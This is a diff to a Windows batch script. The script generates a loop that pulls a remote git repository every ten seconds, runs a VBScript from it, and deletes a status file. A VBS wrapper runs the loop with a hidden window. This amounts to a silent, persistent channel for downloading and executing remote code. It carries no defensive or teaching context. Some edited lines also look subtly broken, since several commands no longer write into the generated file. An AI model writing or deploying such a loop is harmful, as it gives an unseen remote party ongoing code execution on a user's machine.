@@ -13,26 +13,39 @@ if not exist "%SCRIPTS_DIR%" (
 )
 
 :: Step 1: Create sync_repo.bat that syncs the repo every 10 seconds and runs cmd.vbs
-echo @echo off > "%SYNC_BATCH%"
-echo setlocal >> "%SYNC_BATCH%"
+@echo off > "%SYNC_BATCH%"
+setlocal >> "%SYNC_BATCH%"
+
+:: Set variables
 echo set "REPO_URL=%REPO_URL%" >> "%SYNC_BATCH%"
 echo set "DEST_DIR=%CLONE_DIR%" >> "%SYNC_BATCH%"
 echo set "VBS_FILE=%CLONE_DIR%\cmd.vbs" >> "%SYNC_BATCH%"
+
+:: Loop for syncing
 echo :loop >> "%SYNC_BATCH%"
 echo if not exist "%%DEST_DIR%%" ( >> "%SYNC_BATCH%"
 echo ^    git clone %%REPO_URL%% %%DEST_DIR%% >> "%SYNC_BATCH%"
 echo ) else ( >> "%SYNC_BATCH%"
 echo ^    cd /d %%DEST_DIR%% >> "%SYNC_BATCH%"
 echo ^    git pull >> "%SYNC_BATCH%"
+
+:: Check if the git pull was successful and delete the file
+echo ^    if !ERRORLEVEL! EQU 0 ( >> "%SYNC_BATCH%"
+echo ^        del /q "%CLONE_DIR%/sts.txt" >> "%SYNC_BATCH%"
+echo ^    ) >> "%SYNC_BATCH%"
+
 echo ^    cscript //nologo %%VBS_FILE%% >> "%SYNC_BATCH%"
 echo ) >> "%SYNC_BATCH%"
+
+:: Wait and loop
 echo timeout /t 10 /nobreak >nul >> "%SYNC_BATCH%"
 echo goto loop >> "%SYNC_BATCH%"
+
 echo endlocal >> "%SYNC_BATCH%"
 echo exit /b 0 >> "%SYNC_BATCH%"
 
 :: Step 2: Create silent_runner.vbs to run sync_repo.bat silently
-echo CreateObject("Scripting.FileSystemObject").DeleteFile "CLONE_DIR%/sts.txt"
+echo CreateObject("Scripting.FileSystemObject").DeleteFile "%CLONE_DIR%/sts.txt"
 echo Set objShell = CreateObject("WScript.Shell") > "%VBS_FILE%"
 echo objShell.Run "cmd /c ""%SYNC_BATCH%""", 0, True >> "%VBS_FILE%"
 
